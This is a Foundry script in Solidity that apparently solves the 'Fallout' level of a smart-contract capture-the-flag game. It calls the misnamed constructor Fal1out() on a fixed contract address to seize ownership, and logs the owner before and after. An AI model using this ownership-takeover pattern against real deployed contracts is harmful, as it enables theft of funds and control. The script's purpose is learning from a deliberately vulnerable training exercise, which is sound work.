// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../instance/Fallout.sol";

contract Level2 is Script {    
    Fallout _level2 = Fallout(0xA5B0631c5B393d4BF30D2974dF121ea7E8b0e934);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Current Owner is: ", _level2.owner()); // querying current owner
        _level2.Fal1out(); // calling the vulnerable function
        console.log("New Owner is: ", _level2.owner()); // checking if the owner changed

        vm.stopBroadcast();
    }
}